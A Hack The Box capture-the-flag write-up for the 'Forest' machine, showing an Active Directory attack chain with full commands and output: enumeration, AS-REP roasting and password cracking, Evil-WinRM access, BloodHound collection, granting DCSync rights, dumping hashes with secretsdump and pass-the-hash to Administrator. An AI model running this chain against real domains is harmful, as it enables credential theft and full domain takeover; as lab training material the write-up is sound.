---
layout: post
title: "HTB: Forest"
image: ''
date:   2021-09-10 12:00:00
tags:
- beginner
- Active-Directory
description: ''
categories:
- HTB
- Red Team
published: false
comments: false
---

![[Pasted image 20210903122049.png]]

I'm pretty new to doing Hack The Box, so Forest is one the boxes that I rooted as part of the Take It Easy Dare, which taught me a good amount about approaching Active Directory machines. Forest is a domain controller with two domains, although that part isn't as relevant. I'll begin by enumerating common ports, and find users from RPC. One of the users I find is AS-REP roastable, which will allow me to get user. From there, I'll create a user with DCSync Rights so I can dump the system hashes, and pass the hash my way to domain admin.

## Recon
I always like to start my AD/Windows enumeration with nmap and enum4linux.

**Nmap** shows us a lot of typical Windows ports open:
```zsh
kali@kali:~/ctf/htb/forest$ rustscan --ulimit 5000 10.10.10.161 -- -Pn -A scans/initscan.txt

PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2021-09-03 19:11:49Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack Microsoft Windows RPC
49706/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h45m05s, deviation: 4h02m30s, median: 25m05s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 34743/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 51905/udp): CLEAN (Timeout)
|   Check 4 (port 44587/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-09-03T12:12:39-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-09-03T19:12:41
|_  start_date: 2021-09-03T19:07:30

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:47
Completed NSE at 13:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:47
Completed NSE at 13:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:47
Completed NSE at 13:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.45 seconds
```

I also like using [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) which is just a better version of the `enum4linux.pl` that comes with Kali.

```bash
kali@kali:~/ctf/htb/forest$ python3 /opt/enum4linux-ng/enum4linux-ng.py 10.10.10.161 -oY scans/anon-enum

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.10.10.161
[*] Username ......... ''
[*] Random Username .. 'ifbbienz'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ====================================
|    Service Scan on 10.10.10.161    |
 ====================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ====================================================
|    Domain Information via LDAP for 10.10.10.161    |
 ====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: htb.local

 ====================================================
|    NetBIOS Names and Workgroup for 10.10.10.161    |
 ====================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =========================================
|    SMB Dialect Check on 10.10.10.161    |
 =========================================
[*] Check for legacy SMBv1 on 445/tcp
[+] Server supports dialects higher SMBv1

 =========================================
|    RPC Session Check on 10.10.10.161    |
 =========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 ===================================================
|    Domain Information via RPC for 10.10.10.161    |
 ===================================================
[+] Domain: HTB
[+] SID: S-1-5-21-3072663084-364016917-1341370565
[+] Host is part of a domain (not a workgroup)

 ==============================================
|    OS Information via RPC on 10.10.10.161    |
 ==============================================
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED

 =====================================
|    Users via RPC on 10.10.10.161    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 31 users via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 31 users via 'enumdomusers'
[+] After merging user results we have 31 users total:
'1123':
  username: $331000-VK4ADACQNUCA
  name: (null)
  acb: '0x00020015'
  description: (null)
'1124':
  username: SM_2c8eef0a09b545acb
  name: Microsoft Exchange Approval Assistant
  acb: '0x00020011'
  description: (null)
'1125':
  username: SM_ca8c2ed5bdab4dc9b
  name: Microsoft Exchange
  acb: '0x00020011'
  description: (null)
'1126':
  username: SM_75a538d3025e4db9a
  name: Microsoft Exchange
  acb: '0x00020011'
  description: (null)
'1127':
  username: SM_681f53d4942840e18
  name: Discovery Search Mailbox
  acb: '0x00020011'
  description: (null)
'1128':
  username: SM_1b41c9286325456bb
  name: Microsoft Exchange Migration
  acb: '0x00020011'
  description: (null)
'1129':
  username: SM_9b69f1b9d2cc45549
  name: Microsoft Exchange Federation Mailbox
  acb: '0x00020011'
  description: (null)
'1130':
  username: SM_7c96b981967141ebb
  name: E4E Encryption Store - Active
  acb: '0x00020011'
  description: (null)
'1131':
  username: SM_c75ee099d0a64c91b
  name: Microsoft Exchange
  acb: '0x00020011'
  description: (null)
'1132':
  username: SM_1ffab36a2f5f479cb
  name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
  acb: '0x00020011'
  description: (null)
'1134':
  username: HealthMailboxc3d7722
  name: HealthMailbox-EXCH01-Mailbox-Database-1118319013
  acb: '0x00000210'
  description: (null)
'1135':
  username: HealthMailboxfc9daad
  name: HealthMailbox-EXCH01-001
  acb: '0x00000210'
  description: (null)
'1136':
  username: HealthMailboxc0a90c9
  name: HealthMailbox-EXCH01-002
  acb: '0x00000210'
  description: (null)
'1137':
  username: HealthMailbox670628e
  name: HealthMailbox-EXCH01-003
  acb: '0x00000210'
  description: (null)
'1138':
  username: HealthMailbox968e74d
  name: HealthMailbox-EXCH01-004
  acb: '0x00000210'
  description: (null)
'1139':
  username: HealthMailbox6ded678
  name: HealthMailbox-EXCH01-005
  acb: '0x00000210'
  description: (null)
'1140':
  username: HealthMailbox83d6781
  name: HealthMailbox-EXCH01-006
  acb: '0x00000210'
  description: (null)
'1141':
  username: HealthMailboxfd87238
  name: HealthMailbox-EXCH01-007
  acb: '0x00000210'
  description: (null)
'1142':
  username: HealthMailboxb01ac64
  name: HealthMailbox-EXCH01-008
  acb: '0x00000210'
  description: (null)
'1143':
  username: HealthMailbox7108a4e
  name: HealthMailbox-EXCH01-009
  acb: '0x00000210'
  description: (null)
'1144':
  username: HealthMailbox0659cc1
  name: HealthMailbox-EXCH01-010
  acb: '0x00000210'
  description: (null)
'1145':
  username: sebastien
  name: Sebastien Caron
  acb: '0x00000210'
  description: (null)
'1146':
  username: lucinda
  name: Lucinda Berger
  acb: '0x00000210'
  description: (null)
'1147':
  username: svc-alfresco
  name: svc-alfresco
  acb: '0x00010210'
  description: (null)
'1150':
  username: andy
  name: Andy Hislip
  acb: '0x00000210'
  description: (null)
'1151':
  username: mark
  name: Mark Brandt
  acb: '0x00000210'
  description: (null)
'1152':
  username: santi
  name: Santi Rodriguez
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: Administrator
  acb: '0x00000010'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00000011'
  description: Key Distribution Center Service Account
'503':
  username: DefaultAccount
  name: (null)
  acb: '0x00000215'
  description: A user account managed by the system.

 ======================================
|    Groups via RPC on 10.10.10.161    |
 ======================================
[*] Enumerating local groups
[+] Found 5 groups via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 29 groups via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 38 groups via 'enumdomgroups'
[+] After merging groups results we have 72 groups total:
'1101':
  groupname: DnsAdmins
  type: local
'1102':
  groupname: DnsUpdateProxy
  type: domain
'1104':
  groupname: Organization Management
  type: domain
'1105':
  groupname: Recipient Management
  type: domain
'1106':
  groupname: View-Only Organization Management
  type: domain
'1107':
  groupname: Public Folder Management
  type: domain
'1108':
  groupname: UM Management
  type: domain
'1109':
  groupname: Help Desk
  type: domain
'1110':
  groupname: Records Management
  type: domain
'1111':
  groupname: Discovery Management
  type: domain
'1112':
  groupname: Server Management
  type: domain
'1113':
  groupname: Delegated Setup
  type: domain
'1114':
  groupname: Hygiene Management
  type: domain
'1115':
  groupname: Compliance Management
  type: domain
'1116':
  groupname: Security Reader
  type: domain
'1117':
  groupname: Security Administrator
  type: domain
'1118':
  groupname: Exchange Servers
  type: domain
'1119':
  groupname: Exchange Trusted Subsystem
  type: domain
'1120':
  groupname: Managed Availability Servers
  type: domain
'1121':
  groupname: Exchange Windows Permissions
  type: domain
'1122':
  groupname: ExchangeLegacyInterop
  type: domain
'1133':
  groupname: $D31000-NSEL5BRJ63V7
  type: domain
'1148':
  groupname: Service Accounts
  type: domain
'1149':
  groupname: Privileged IT Accounts
  type: domain
'498':
  groupname: Enterprise Read-only Domain Controllers
  type: domain
'5101':
  groupname: test
  type: domain
'512':
  groupname: Domain Admins
  type: domain
'513':
  groupname: Domain Users
  type: domain
'514':
  groupname: Domain Guests
  type: domain
'515':
  groupname: Domain Computers
  type: domain
'516':
  groupname: Domain Controllers
  type: domain
'517':
  groupname: Cert Publishers
  type: local
'518':
  groupname: Schema Admins
  type: domain
'519':
  groupname: Enterprise Admins
  type: domain
'520':
  groupname: Group Policy Creator Owners
  type: domain
'521':
  groupname: Read-only Domain Controllers
  type: domain
'522':
  groupname: Cloneable Domain Controllers
  type: domain
'525':
  groupname: Protected Users
  type: domain
'526':
  groupname: Key Admins
  type: domain
'527':
  groupname: Enterprise Key Admins
  type: domain
'544':
  groupname: Administrators
  type: builtin
'545':
  groupname: Users
  type: builtin
'546':
  groupname: Guests
  type: builtin
'548':
  groupname: Account Operators
  type: builtin
'549':
  groupname: Server Operators
  type: builtin
'550':
  groupname: Print Operators
  type: builtin
'551':
  groupname: Backup Operators
  type: builtin
'552':
  groupname: Replicator
  type: builtin
'553':
  groupname: RAS and IAS Servers
  type: local
'554':
  groupname: Pre-Windows 2000 Compatible Access
  type: builtin
'555':
  groupname: Remote Desktop Users
  type: builtin
'556':
  groupname: Network Configuration Operators
  type: builtin
'557':
  groupname: Incoming Forest Trust Builders
  type: builtin
'558':
  groupname: Performance Monitor Users
  type: builtin
'559':
  groupname: Performance Log Users
  type: builtin
'560':
  groupname: Windows Authorization Access Group
  type: builtin
'561':
  groupname: Terminal Server License Servers
  type: builtin
'562':
  groupname: Distributed COM Users
  type: builtin
'568':
  groupname: IIS_IUSRS
  type: builtin
'569':
  groupname: Cryptographic Operators
  type: builtin
'571':
  groupname: Allowed RODC Password Replication Group
  type: local
'572':
  groupname: Denied RODC Password Replication Group
  type: local
'573':
  groupname: Event Log Readers
  type: builtin
'574':
  groupname: Certificate Service DCOM Access
  type: builtin
'575':
  groupname: RDS Remote Access Servers
  type: builtin
'576':
  groupname: RDS Endpoint Servers
  type: builtin
'577':
  groupname: RDS Management Servers
  type: builtin
'578':
  groupname: Hyper-V Administrators
  type: builtin
'579':
  groupname: Access Control Assistance Operators
  type: builtin
'580':
  groupname: Remote Management Users
  type: builtin
'581':
  groupname: System Managed Accounts Group
  type: builtin
'582':
  groupname: Storage Replica Administrators
  type: builtin

 ======================================
|    Shares via RPC on 10.10.10.161    |
 ======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 =========================================
|    Policies via RPC for 10.10.10.161    |
 =========================================
[*] Trying port 445/tcp
[+] Found policy:
domain_password_information:
  pw_history_length: 24
  min_pw_length: 7
  min_pw_age: 1 day 4 minutes
  max_pw_age: not set
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
domain_lockout_information:
  lockout_observation_window: 30 minutes
  lockout_duration: 30 minutes
  lockout_threshold: None
domain_logoff_information:
  force_logoff_time: not set

 =========================================
|    Printers via RPC for 10.10.10.161    |
 =========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED
```

From this we gain the following information:
- This is an Active Directory DC as evidenced by the presence of ports like 88 (Kerberos)
- Domain is `htb.local`
- We could get an Evil-WinRM shell due to the presence of port 5985

But more importantly...
- We have a list of users and groups from enumerating RPC using `enum4linux-ng`

There are a bunch of random program users that aren't likely to be the avenue to foothold, so I'm just going to add the users and service accounts that seem reasonsable to add to a users list.

```shell
kali@kali:~/ctf/htb/forest$ cat users.txt
Administrator
sebastien
lucinda
andy
mark
santi
svc-alfresco
```

I'm going to add `htb.local` to my `/etc/hosts` file to make it easier for myself when typing out commands. I know `smbclient` won't really work without credentials because of the enum4linux output, so I think I'll start by AS-REP roasting the users I got since I don't really have any other leads.

AS-REP roasting exploits a permission known as `UF_DONT_REQUIRE_PREAUTH`, where, if set to true, a user doesn't need to preauthenticate with Kerberos to get their ticket. We can abuse this to grab the Ticket Granting Ticket that a user would use to authenticate to Kerberos without needing their password.

```shell
kali@kali:~/ctf/htb/forest$ cat users.txt | while read line; do python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 htb.local/$line -no-pass; done

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:232e198e9fe165f5d2a0181994a1e6e4$fb53384df136dcc5aab6aad6f8b947f9647fd5a06aa5dc316c75f9b229ae72b96b146d3018604cb6c81bc55695c2f181bc9ce2e561faa207d206035b79794f0e53942996b43a272f7f9baec02d08c1cf791fd7a0bd79afd08baba81f2d9bc7364e9ff590e34cf4822b4fcceb4b97efcfdd01830b553238419a3e2c4b1bba111d7f0a316c80e3566c3531b357111ecaa4da74d432c12b4aa27699b78dea78ee5b416266ddde8c3319145afef0fd934520c35bb30e3fec8663378f3093574642eddb4b9118a33437af434f0c57329ae9246e1de74216584788610d1f614840047f00eb30853c93
```

## User

If `svc-alfresco` has a weak password, we can crack the ticket and possibly get shell:
```shell
kali@kali:~/ctf/htb/forest$ sudo john svc-alfresco --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:18 DONE (2021-09-03 16:01) 0.05543g/s 226480p/s 226480c/s 226480C/s s3s1k2..s3rj12
Use the "--show" option to display all of the cracked passwords reliably
Session completed

kali@kali:~/ctf/htb/forest$ evil-winrm -u svc-alfresco -p s3rvice -i htb.local

Evil-WinRM shell v3.2

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type ..\Desktop\user.txt
368cfa08************************
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Which we definitely can.

## Privesc to Administrator

Since the box is called Forest, I don't anticipate needing to run [winPEAS](https://github.com/carlospolop/PEASS-ng), although I normally would. In this case, I'm going to jump straight to Bloodhound, a tool that can map out relationships in an Active Directory environment to advise us as to what to do next. 
- Install bloodhound and neo4j: `sudo apt install bloodhound neo4j`
- Download PowerView: [[link](https://github.com/PowerShellMafia/PowerSploit)]

I'm going to copy `SharpHound.ps1` and `PowerView.ps1` to the DC using `evil-winrm`'s built in upload and download command:
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload ./www/PowerView.ps1 .
Info: Uploading ./www/PowerView.ps1 to .                                      
Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload ./www/SharpHound.ps1 .
Info: Uploading ./www/SharpHound.ps1 to .                                         
Data: 1298980 bytes of 1298980 bytes copied

Info: Upload successful!
```

Once I've uploaded both powershell modules, I'll import them by doing `. .\SharpHound.ps1` and `. .\PowerView.ps1`. It might look weird, but this way of doing it has always been most consistent for me.

On my Kali machine, I'm going to start bloodhound by running `bloodhound`, and start the `neo4j` database using `sudo neo4j console`. I'll sign in as needed.

After that's taken care of, I'll run the following command on the DC:
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-Bloodhound -CollectionMethod All -Domain htb.local -ZipFileName lootme.zip
```

This will allow me to collect all of the Active Directory data that this service account has to offer. I'll download the zip file that comes off of it, and drag and drop it right into Bloodhound. After that's unzipped and loaded in, I'll mark `svc-alfresco` as "owned" and look for "Shortest Path to Domain Admins".

![[Pasted image 20210903163250.png]]

*Your path might look different than mine, but these privesc steps are all the same.*

Here we see a fairly large graph. As you'll notice, there are actually two domains in this environment, `htb.local` and `forest.htb.local`, which is why this box is named the way it is (2 joined domains are a forest).

From svc-alfresco, marked with a skull, we see two jumps necessary to get to domain admin. Since svc-alfresco is a part of the Account Operators group, it has the generic all privilege on the Exchange Windows Permissions group. Right clicking the edge to learn more, we find the following abuse info:
![[Pasted image 20210903163652.png]]

Essentially, this means we can give our account, or any account, DCSync Privileges, which can allow us to run secretsdump.py or mimikatz to dump hashes. If this works, we can use the NT hash we get to pass the hash and become administrator.

## Execution

Since this is a public box, I don't want to make it easy so I'll make my own account first and add it to the Exchange Windows Permissions group.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user An00bRektn An00bRektn /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add An00bRektn
The command completed successfully.
```

We then attempt give ourselves DC Sync Rights according to the Bloodhound Abuse Info.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'An00bRektn' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB\An00bRektn', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
The term 'Add-DomainObjectAcl' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Righ ...
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Add-DomainObjectAcl:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

As you can see, Add-DomainObjectAcl wasn't working. I took to Google, and found that I might need to specify a TargetIdentity and PrincipalIdentity. After some adjustments, we run it again.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity An00bRektn -Rights DCSync
```

We can then use secretsdump.py from impacket to dump all of the system hashes (output not shown because spoilers).

```shell
kali@kali:~/ctf/htb/forest$ python3 /opt/impacket/examples/secretsdump.py -just-dc An00bRektn@htb.local
```

We pass the hash using `evil-winrm` and grab the root flag.

```shell
kali@kali:~/ctf/htb/forest$ evil-winrm -u Administrator -H 32693b11************************ -i htb.local

Evil-WinRM shell v3.2

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
68e7ab70************************
```